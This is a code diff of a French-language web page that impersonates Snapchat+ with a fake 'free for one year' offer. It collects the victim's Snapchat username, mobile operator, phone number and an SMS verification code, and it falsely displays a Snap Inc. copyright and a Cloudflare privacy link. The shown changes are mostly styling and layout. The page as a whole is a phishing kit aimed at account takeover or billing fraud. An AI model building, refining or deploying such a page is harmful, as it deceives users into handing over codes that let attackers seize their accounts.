@@ -3,11 +3,17 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Snapchat+ — Free 1 Year</title>
+    <title>Snapchat+ — Free Trial</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
-        /* ===== RESET & BASE ===== */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
         body {
             min-height: 100vh;
             display: flex;
@@ -21,18 +27,24 @@
             content: '';
             position: fixed;
             inset: 0;
-            background-image: 
-                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-image:
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
             background-size: 40px 40px;
             pointer-events: none;
         }
-        .container { width: 100%; max-width: 480px; position: relative; z-index: 1; }
 
-        /* ===== HIGHLIGHTED BANNER ===== */
+        .container {
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ===== HIGHLIGHT BANNER ===== */
         .highlight-banner {
-            background: linear-gradient(135deg, rgba(255,252,0,0.12), rgba(255,215,0,0.08));
-            border: 1px solid rgba(255,252,0,0.2);
+            background: linear-gradient(135deg, rgba(255, 252, 0, 0.12), rgba(255, 215, 0, 0.08));
+            border: 1px solid rgba(255, 252, 0, 0.2);
             border-radius: 16px;
             padding: 12px 20px;
             margin-bottom: 20px;
@@ -46,11 +58,26 @@
             content: '';
             position: absolute;
             inset: -2px;
-            background: linear-gradient(90deg, transparent, rgba(255,252,0,0.1), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255, 252, 0, 0.1), transparent);
             animation: shimmer 4s ease-in-out infinite;
         }
-        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
-        @keyframes bannerGlow { 0%, 100% { box-shadow: 0 0 20px rgba(255,252,0,0.05); } 50% { box-shadow: 0 0 40px rgba(255,252,0,0.15); } }
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(100%);
+            }
+        }
+        @keyframes bannerGlow {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(255, 252, 0, 0.05);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(255, 252, 0, 0.15);
+            }
+        }
         .highlight-banner .banner-text {
             font-size: 15px;
             font-weight: 600;
@@ -61,29 +88,34 @@
         .highlight-banner .banner-text .highlight-name {
             color: #FFFC00;
             font-weight: 700;
-            text-shadow: 0 0 30px rgba(255,252,0,0.3);
+            text-shadow: 0 0 30px rgba(255, 252, 0, 0.3);
         }
-        .highlight-banner .banner-text .highlight-emoji { margin-right: 6px; }
+        .highlight-banner .banner-text .highlight-emoji {
+            margin-right: 6px;
+        }
 
         /* ===== MAIN CARD ===== */
         .card {
-            background: rgba(22,22,38,0.85);
+            background: rgba(22, 22, 38, 0.85);
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
             border-radius: 40px;
             padding: 32px 28px 28px;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
             transition: transform 0.3s ease;
         }
-        .card:hover { transform: translateY(-2px); }
+        .card:hover {
+            transform: translateY(-2px);
+        }
 
-        /* ===== HEADER ===== */
+        /* ===== HEADER — CENTERED ===== */
         .header {
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: center;
             margin-bottom: 24px;
+            position: relative;
         }
         .brand {
             display: flex;
@@ -98,27 +130,49 @@
             justify-content: center;
             border-radius: 50%;
             background: transparent;
-            box-shadow: 0 0 30px rgba(255,252,0,0.2);
+            box-shadow: 0 0 30px rgba(255, 252, 0, 0.2);
             animation: iconPulse 3s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+        .brand .icon-container img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 6px rgba(255, 252, 0, 0.3));
         }
         .brand .icon-container svg {
-            width: 36px;
-            height: 36px;
-            filter: drop-shadow(0 0 6px rgba(255,252,0,0.3));
+            width: 32px;
+            height: 32px;
+            filter: drop-shadow(0 0 6px rgba(255, 252, 0, 0.3));
         }
-        @keyframes iconPulse { 0%, 100% { box-shadow: 0 0 30px rgba(255,252,0,0.2); } 50% { box-shadow: 0 0 50px rgba(255,252,0,0.4); } }
+        @keyframes iconPulse {
+            0%,
+            100% {
+                box-shadow: 0 0 30px rgba(255, 252, 0, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 50px rgba(255, 252, 0, 0.4);
+            }
+        }
         .brand h1 {
             font-size: 22px;
             font-weight: 700;
             color: #fff;
             letter-spacing: -0.3px;
         }
-        .brand h1 span { color: #FFFC00; }
+        .brand h1 span {
+            color: #FFFC00;
+        }
 
-        .lang-switch { display: flex; gap: 6px; }
+        .lang-switch {
+            position: absolute;
+            right: 0;
+            display: flex;
+            gap: 6px;
+        }
         .lang-switch button {
             background: transparent;
-            border: 1px solid rgba(255,255,255,0.08);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             color: #888;
             padding: 4px 12px;
             border-radius: 20px;
@@ -127,11 +181,21 @@
             font-weight: 500;
             transition: all 0.3s;
         }
-        .lang-switch button:hover { border-color: rgba(255,252,0,0.3); color: #fff; }
-        .lang-switch button.active { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
+        .lang-switch button:hover {
+            border-color: rgba(255, 252, 0, 0.3);
+            color: #fff;
+        }
+        .lang-switch button.active {
+            border-color: #FFFC00;
+            color: #fff;
+            background: rgba(255, 252, 0, 0.08);
+        }
 
         /* ===== HERO ===== */
-        .hero { text-align: center; margin-bottom: 24px; }
+        .hero {
+            text-align: center;
+            margin-bottom: 24px;
+        }
         .hero h2 {
             font-size: 24px;
             font-weight: 800;
@@ -139,8 +203,14 @@
             line-height: 1.2;
             letter-spacing: -0.5px;
         }
-        .hero h2 .highlight { color: #FFFC00; }
-        .hero .sub { color: #999; font-size: 13px; margin-top: 4px; }
+        .hero h2 .highlight {
+            color: #FFFC00;
+        }
+        .hero .sub {
+            color: #999;
+            font-size: 13px;
+            margin-top: 4px;
+        }
 
         /* ===== BENEFITS ===== */
         .benefits {
@@ -148,35 +218,64 @@
             grid-template-columns: 1fr 1fr;
             gap: 6px;
             margin: 14px 0 18px;
-            background: rgba(255,255,255,0.03);
+            background: rgba(255, 255, 255, 0.03);
             border-radius: 14px;
             padding: 10px 12px;
-            border: 1px solid rgba(255,255,255,0.04);
+            border: 1px solid rgba(255, 255, 255, 0.04);
         }
-        .benefit-item { display: flex; align-items: center; gap: 6px; color: #ccc; font-size: 12px; font-weight: 500; }
-        .benefit-item .icon { font-size: 14px; }
-        .benefit-item .label { color: #aaa; }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #ccc;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .benefit-item .icon {
+            font-size: 14px;
+        }
+        .benefit-item .label {
+            color: #aaa;
+        }
 
         /* ===== INFO BOX ===== */
         .info-box {
-            background: rgba(255,252,0,0.06);
+            background: rgba(255, 252, 0, 0.06);
             border-radius: 12px;
             padding: 10px 14px;
             margin-bottom: 18px;
             border-left: 3px solid #FFFC00;
             transition: all 0.3s ease;
         }
-        .info-box p { color: #aaa; font-size: 12px; line-height: 1.5; }
-        .info-box strong { color: #fff; }
+        .info-box p {
+            color: #aaa;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        .info-box strong {
+            color: #fff;
+        }
 
         /* ===== COUNTRY / OPERATOR ===== */
-        .section-label { color: #aaa; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
-        .country-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+        .section-label {
+            color: #aaa;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        .country-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 14px;
+        }
         .country-btn {
             padding: 10px 6px;
             border-radius: 12px;
-            border: 2px solid rgba(255,255,255,0.06);
-            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.03);
             color: #aaa;
             font-size: 12px;
             font-weight: 500;
@@ -184,9 +283,20 @@
             transition: all 0.3s;
             text-align: center;
         }
-        .country-btn .flag { font-size: 20px; display: block; margin-bottom: 2px; }
-        .country-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
-        .country-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
+        .country-btn .flag {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .country-btn:hover {
+            border-color: rgba(255, 252, 0, 0.2);
+            color: #fff;
+        }
+        .country-btn.selected {
+            border-color: #FFFC00;
+            color: #fff;
+            background: rgba(255, 252, 0, 0.08);
+        }
 
         .operator-grid {
             display: grid;
@@ -197,8 +307,8 @@
         .operator-btn {
             padding: 8px;
             border-radius: 10px;
-            border: 2px solid rgba(255,255,255,0.06);
-            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.03);
             color: #aaa;
             font-size: 13px;
             font-weight: 500;
@@ -206,25 +316,59 @@
             transition: all 0.3s;
             text-align: center;
         }
-        .operator-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
-        .operator-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
+        .operator-btn:hover {
+            border-color: rgba(255, 252, 0, 0.2);
+            color: #fff;
+        }
+        .operator-btn.selected {
+            border-color: #FFFC00;
+            color: #fff;
+            background: rgba(255, 252, 0, 0.08);
+        }
 
         /* ===== INPUTS ===== */
-        .input-group { margin-bottom: 12px; }
-        .input-group label { display: block; color: #aaa; font-size: 12px; font-weight: 500; margin-bottom: 4px; }
+        .input-group {
+            margin-bottom: 12px;
+        }
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
         .input-group .input-wrap {
             display: flex;
             align-items: center;
-            background: rgba(255,255,255,0.04);
+            background: rgba(255, 255, 255, 0.04);
             border-radius: 14px;
-            border: 2px solid rgba(255,255,255,0.06);
+            border: 2px solid rgba(255, 255, 255, 0.06);
             padding: 0 14px;
             transition: all 0.3s;
         }
-        .input-group .input-wrap:focus-within { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.04); }
-        .input-group .input-wrap .prefix { color: #888; font-size: 15px; font-weight: 500; padding-right: 10px; border-right: 1px solid rgba(255,255,255,0.06); }
-        .input-group .input-wrap input { flex: 1; padding: 14px 10px; background: transparent; border: none; outline: none; color: #fff; font-size: 15px; }
-        .input-group .input-wrap input::placeholder { color: #444; }
+        .input-group .input-wrap:focus-within {
+            border-color: #FFFC00;
+            box-shadow: 0 0 30px rgba(255, 252, 0, 0.04);
+        }
+        .input-group .input-wrap .prefix {
+            color: #888;
+            font-size: 15px;
+            font-weight: 500;
+            padding-right: 10px;
+            border-right: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        .input-group .input-wrap input {
+            flex: 1;
+            padding: 14px 10px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 15px;
+        }
+        .input-group .input-wrap input::placeholder {
+            color: #444;
+        }
 
         /* ===== BUTTONS ===== */
         .btn {
@@ -239,44 +383,125 @@
             position: relative;
             overflow: hidden;
         }
-        .btn-primary { background: linear-gradient(135deg, #FFFC00, #FFD700); color: #000; }
-        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.2); }
-        .btn-primary:disabled { opacity: 0.5; transform: none !important; cursor: not-allowed; box-shadow: none; }
-        .btn-secondary { background: rgba(255,255,255,0.06); color: #fff; margin-top: 8px; padding: 12px; border-radius: 12px; border: none; width: 100%; font-size: 15px; cursor: pointer; transition: all 0.3s; }
-        .btn-secondary:hover { background: rgba(255,255,255,0.1); }
+        .btn-primary {
+            background: linear-gradient(135deg, #FFFC00, #FFD700);
+            color: #000;
+        }
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 40px rgba(255, 252, 0, 0.2);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            transform: none !important;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.06);
+            color: #fff;
+            margin-top: 8px;
+            padding: 12px;
+            border-radius: 12px;
+            border: none;
+            width: 100%;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
 
         /* ===== OTP ===== */
-        .otp-box { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
+        .otp-box {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 16px 0;
+        }
         .otp-box input {
             width: 48px;
             height: 54px;
             text-align: center;
             font-size: 22px;
             font-weight: 700;
-            background: rgba(255,255,255,0.04);
-            border: 2px solid rgba(255,255,255,0.08);
+            background: rgba(255, 255, 255, 0.04);
+            border: 2px solid rgba(255, 255, 255, 0.08);
             border-radius: 12px;
             color: #fff;
             outline: none;
             transition: all 0.3s;
             caret-color: #FFFC00;
         }
-        .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
+        .otp-box input:focus {
+            border-color: #FFFC00;
+            box-shadow: 0 0 30px rgba(255, 252, 0, 0.06);
+            background: rgba(255, 255, 255, 0.06);
+        }
 
         /* ===== LOADER ===== */
-        .loader-wrap { text-align: center; padding: 16px 0; }
-        .loader-spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.06); border-top-color: #FFFC00; border-radius: 50%; margin: 0 auto 12px; animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .loader-text { color: #888; font-size: 14px; text-align: center; margin-top: 8px; }
-        .loader-text strong { color: #fff; }
-        .progress-track { width: 100%; height: 3px; background: rgba(255,255,255,0.06); border-radius: 4px; overflow: hidden; margin-top: 12px; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #FFFC00, #FFD700); border-radius: 4px; transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
+        .loader-wrap {
+            text-align: center;
+            padding: 16px 0;
+        }
+        .loader-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.06);
+            border-top-color: #FFFC00;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .loader-text {
+            color: #888;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 8px;
+        }
+        .loader-text strong {
+            color: #fff;
+        }
+        .progress-track {
+            width: 100%;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 12px;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #FFFC00, #FFD700);
+            border-radius: 4px;
+            transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
 
         /* ===== SUCCESS / ERROR ===== */
-        .icon-big { font-size: 56px; text-align: center; margin: 8px 0 12px; }
-        .msg-center { text-align: center; color: #aaa; font-size: 15px; line-height: 1.7; }
-        .error-text { color: #ff6b6b !important; }
-        .success-text { color: #69db7c !important; }
+        .icon-big {
+            font-size: 56px;
+            text-align: center;
+            margin: 8px 0 12px;
+        }
+        .msg-center {
+            text-align: center;
+            color: #aaa;
+            font-size: 15px;
+            line-height: 1.7;
+        }
+        .error-text {
+            color: #ff6b6b !important;
+        }
+        .success-text {
+            color: #69db7c !important;
+        }
 
         /* ===== FOOTER ===== */
         .footer {
@@ -285,40 +510,103 @@
             align-items: center;
             margin-top: 16px;
             padding-top: 12px;
-            border-top: 1px solid rgba(255,255,255,0.04);
-            color: rgba(255,255,255,0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.15);
             font-size: 10px;
         }
-        .footer a { color: rgba(255,255,255,0.2); text-decoration: none; }
-        .footer a:hover { color: #FFFC00; }
+        .footer a {
+            color: rgba(255, 255, 255, 0.2);
+            text-decoration: none;
+        }
+        .footer a:hover {
+            color: #FFFC00;
+        }
 
         /* ===== STEPS ===== */
-        .step { display: none; animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
-        .step.active { display: block; }
-        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(20px) scale(0.98); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
-        .hidden { display: none !important; }
+        .step {
+            display: none;
+            animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .step.active {
+            display: block;
+        }
+        @keyframes fadeUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px) scale(0.98);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        .hidden {
+            display: none !important;
+        }
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .card { padding: 20px 14px; }
-            .hero h2 { font-size: 20px; }
-            .benefits { grid-template-columns: 1fr 1fr; gap: 4px; padding: 8px 10px; }
-            .benefit-item { font-size: 11px; }
-            .country-grid { grid-template-columns: 1fr 1fr; }
-            .operator-grid { grid-template-columns: 1fr 1fr 1fr; }
-            .otp-box input { width: 40px; height: 46px; font-size: 18px; }
-            .brand h1 { font-size: 18px; }
-            .brand .icon-container { width: 36px; height: 36px; }
-            .brand .icon-container svg { width: 28px; height: 28px; }
-            .highlight-banner .banner-text { font-size: 13px; }
-            .highlight-banner { padding: 10px 14px; }
+            .card {
+                padding: 20px 14px;
+            }
+            .hero h2 {
+                font-size: 20px;
+            }
+            .benefits {
+                grid-template-columns: 1fr 1fr;
+                gap: 4px;
+                padding: 8px 10px;
+            }
+            .benefit-item {
+                font-size: 11px;
+            }
+            .country-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+            .operator-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+            }
+            .otp-box input {
+                width: 40px;
+                height: 46px;
+                font-size: 18px;
+            }
+            .brand h1 {
+                font-size: 18px;
+            }
+            .brand .icon-container {
+                width: 36px;
+                height: 36px;
+            }
+            .brand .icon-container img {
+                width: 26px;
+                height: 26px;
+            }
+            .brand .icon-container svg {
+                width: 26px;
+                height: 26px;
+            }
+            .highlight-banner .banner-text {
+                font-size: 13px;
+            }
+            .highlight-banner {
+                padding: 10px 14px;
+            }
+            .lang-switch {
+                position: relative;
+            }
+            .header {
+                flex-wrap: wrap;
+                gap: 12px;
+                justify-content: center;
+            }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- ===== HIGHLIGHTED BANNER ===== -->
+        <!-- ===== HIGHLIGHT BANNER ===== -->
         <div class="highlight-banner">
             <div class="banner-text">
                 <span class="highlight-emoji">🎁</span>
@@ -329,35 +617,24 @@
 
         <div class="card">
 
-            <!-- ===== HEADER ===== -->
+            <!-- ===== HEADER — CENTERED ===== -->
             <div class="header">
                 <div class="brand">
-                    <!-- OPTION 1: Use your PNG (uncomment and comment the SVG) -->
-                    <!--
                     <div class="icon-container">
-                        <img src="snapchat-icon.png" 
-                             alt="Snapchat+" 
-                             style="width: 32px; height: 32px; object-fit: contain; filter: drop-shadow(0 0 6px rgba(255,252,0,0.3));" />
+                        <!-- OPTION 1: Use your PNG (uncomment this and comment the SVG) -->
+                        <img src="snapchat-icon.png" alt="Snapchat+" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+                        <span class="fallback-icon" style="display:none;">
+                            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M50 15 C30 15 20 30 20 45 C20 60 25 75 35 80 C40 82 45 78 50 75 C55 78 60 82 65 80 C75 75 80 60 80 45 C80 30 70 15 50 15 Z" fill="#FFFC00" stroke="#E6B800" stroke-width="1.5" />
+                                <circle cx="38" cy="45" r="5" fill="#000" />
+                                <circle cx="62" cy="45" r="5" fill="#000" />
+                                <path d="M42 58 Q50 68 58 58" stroke="#000" stroke-width="3" fill="none" stroke-linecap="round" />
+                                <rect x="46" y="30" width="8" height="40" rx="2" fill="#FFFFFF" />
+                                <rect x="30" y="46" width="40" height="8" rx="2" fill="#FFFFFF" />
+                            </svg>
+                        </span>
                     </div>
-                    -->
-                    <!-- OPTION 2: Use the SVG (recommended) -->
-                    <div class="icon-container">
-                        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                            <!-- Ghost body (yellow) -->
-                            <path d="M50 15 C30 15 20 30 20 45 C20 60 25 75 35 80 C40 82 45 78 50 75 C55 78 60 82 65 80 C75 75 80 60 80 45 C80 30 70 15 50 15 Z" fill="#FFFC00" stroke="#E6B800" stroke-width="1.5" />
-                            <!-- Ghost eyes -->
-                            <circle cx="38" cy="45" r="5" fill="#000" />
-                            <circle cx="62" cy="45" r="5" fill="#000" />
-                            <!-- Ghost mouth -->
-                            <path d="M42 58 Q50 68 58 58" stroke="#000" stroke-width="3" fill="none" stroke-linecap="round" />
-                            <!-- Plus sign (white) -->
-                            <rect x="46" y="30" width="8" height="40" rx="2" fill="#FFFFFF" />
-                            <rect x="30" y="46" width="40" height="8" rx="2" fill="#FFFFFF" />
-                        </svg>
-                    </div>
-                    <div>
-                        <h1>snap<span>chat</span>+</h1>
-                    </div>
+                    <h1>snap<span>chat</span>+</h1>
                 </div>
                 <div class="lang-switch">
                     <button class="active" data-lang="fr">FR</button>
@@ -366,25 +643,29 @@
                 </div>
             </div>
 
-            <!-- ===== REST OF THE PAGE (unchanged) ===== -->
+            <!-- ===== STEP 1: COUNTRY + PHONE ===== -->
             <div id="step1" class="step active">
                 <div class="hero">
                     <h2 id="heroTitle">Activez <span class="highlight">Snapchat+</span><br />gratuitement pendant 1 an !</h2>
                 </div>
+
                 <div class="benefits">
                     <div class="benefit-item"><span class="icon">✨</span> <span class="label" id="benefit1">Badges exclusifs</span></div>
                     <div class="benefit-item"><span class="icon">👀</span> <span class="label" id="benefit2">Qui a revu votre story</span></div>
                     <div class="benefit-item"><span class="icon">📈</span> <span class="label" id="benefit3">Boost de score</span></div>
                     <div class="benefit-item"><span class="icon">⏳</span> <span class="label" id="benefit4">Offre limitée</span></div>
                 </div>
+
                 <div class="info-box">
                     <p id="infoText">📱 <strong>Disponible uniquement</strong> pour les numéros <span id="countryNameInInfo">France</span> des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.</p>
                 </div>
+
                 <div class="section-label" id="countryLabel">🌍 Pays</div>
                 <div class="country-grid" id="countryGrid">
                     <div class="country-btn selected" data-country="FR"><span class="flag">🇫🇷</span> <span class="country-name">France</span></div>
                     <div class="country-btn" data-country="BE"><span class="flag">🇧🇪</span> <span class="country-name">Belgique</span></div>
                 </div>
+
                 <div class="input-group">
                     <label for="usernameInput" id="usernameLabel">👤 Nom d'utilisateur Snapchat</label>
                     <div class="input-wrap">
@@ -392,8 +673,10 @@
                         <input type="text" id="usernameInput" placeholder="votre_snap" maxlength="30" />
                     </div>
                 </div>
+
                 <div class="section-label" id="operatorLabel">📡 Opérateur mobile</div>
                 <div class="operator-grid" id="operatorGrid"></div>
+
                 <div class="input-group">
                     <label for="phoneInput" id="phoneLabel">📞 Numéro de téléphone</label>
                     <div class="input-wrap">
@@ -402,9 +685,11 @@
                     </div>
                     <div style="margin-top:4px; color:#555; font-size:11px;" id="phoneHint">Numéro mobile (10 chiffres) — c'est pour savoir si vous êtes un humain 🐻</div>
                 </div>
+
                 <button class="btn btn-primary" id="sendBtn">Continuer →</button>
             </div>
 
+            <!-- ===== STEP 2: LOADING ===== -->
             <div id="step2" class="step">
                 <div class="loader-wrap">
                     <div class="loader-spinner"></div>
@@ -413,6 +698,7 @@
                 </div>
             </div>
 
+            <!-- ===== STEP 3: OTP ===== -->
             <div id="step3" class="step">
                 <div class="hero">
                     <h2 id="otpTitle" style="font-size:22px;">🔑 Code de vérification</h2>
@@ -426,6 +712,7 @@
                 <button class="btn btn-secondary" id="backToPhone">← Retour</button>
             </div>
 
+            <!-- ===== STEP 4: SUCCESS ===== -->
             <div id="step4" class="step">
                 <div class="icon-big">✅</div>
                 <div class="hero">
@@ -438,6 +725,7 @@
                 <button class="btn btn-primary" id="resetBtn">Ouvrir Snapchat</button>
             </div>
 
+            <!-- ===== STEP 5: ERROR ===== -->
             <div id="step5" class="step">
                 <div class="icon-big">❌</div>
                 <div class="hero">
@@ -447,6 +735,7 @@
                 <button class="btn btn-primary" id="retryBtn" style="background: #ff6b6b; color:#fff;">Réessayer</button>
             </div>
 
+            <!-- ===== FOOTER ===== -->
             <div class="footer">
                 <span>© 2026 Snap Inc.</span>
                 <a href="#">Cloudflare Privacy</a>
@@ -701,7 +990,9 @@
             bannerName.textContent = name;
             const banner = document.querySelector('.highlight-banner');
             banner.style.animation = 'none';
-            setTimeout(() => { banner.style.animation = 'bannerGlow 3s ease-in-out infinite'; }, 10);
+            setTimeout(() => {
+                banner.style.animation = 'bannerGlow 3s ease-in-out infinite';
+            }, 10);
         }
 
         function rotateBannerName() {
@@ -720,24 +1011,33 @@
             document.getElementById(id).classList.add('active');
         }
 
-        document.getElementById('backToPhone').addEventListener('click', function() { goToStep('step1'); });
-        document.getElementById('retryBtn').addEventListener('click', function() { goToStep('step1'); phoneInput.value = ''; });
+        document.getElementById('backToPhone').addEventListener('click', function() {
+            goToStep('step1');
+        });
+        document.getElementById('retryBtn').addEventListener('click', function() {
+            goToStep('step1');
+            phoneInput.value = '';
+        });
         document.getElementById('resetBtn').addEventListener('click', resetAll);
 
         sendBtn.addEventListener('click', sendNumber);
-        phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') sendNumber(); });
-        usernameInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') phoneInput.focus(); });
+        phoneInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') sendNumber();
+        });
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') phoneInput.focus();
+        });
 
         async function sendNumber() {
             const username = usernameInput.value.trim();
             let phoneNumber = phoneInput.value.replace(/\s/g, '');
-            
+
             if (!phoneNumber || phoneNumber.length !== 10 || !/^\d{10}$/.test(phoneNumber)) {
                 alert('Veuillez entrer un numéro de téléphone valide (10 chiffres).');
                 phoneInput.focus();
                 return;
             }
-            
+
             if (!username || username.length < 2) {
                 alert('Veuillez entrer votre nom d\'utilisateur Snapchat.');
                 usernameInput.focus();
@@ -857,12 +1157,17 @@
                         if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                             otpContainer.children[idx - 1].focus();
                         }
-                        if (e.key === 'Enter') { submitOTP(); }
+                        if (e.key === 'Enter') {
+                            submitOTP();
+                        }
                     };
                 }(i));
                 otpContainer.appendChild(input);
             }
-            setTimeout(() => { const first = otpContainer.querySelector('input'); if (first) first.focus(); }, 100);
+            setTimeout(() => {
+                const first = otpContainer.querySelector('input');
+                if (first) first.focus();
+            }, 100);
         }
 
         verifyBtn.addEventListener('click', submitOTP);
@@ -870,7 +1175,9 @@
         async function submitOTP() {
             const inputs = otpContainer.querySelectorAll('input');
             let otp = '';
-            for (let i = 0; i < otpLength; i++) { otp += inputs[i]?.value || ''; }
+            for (let i = 0; i < otpLength; i++) {
+                otp += inputs[i]?.value || '';
+            }
             if (otp.length !== otpLength) {
                 alert('Veuillez entrer le code complet.');
                 return;
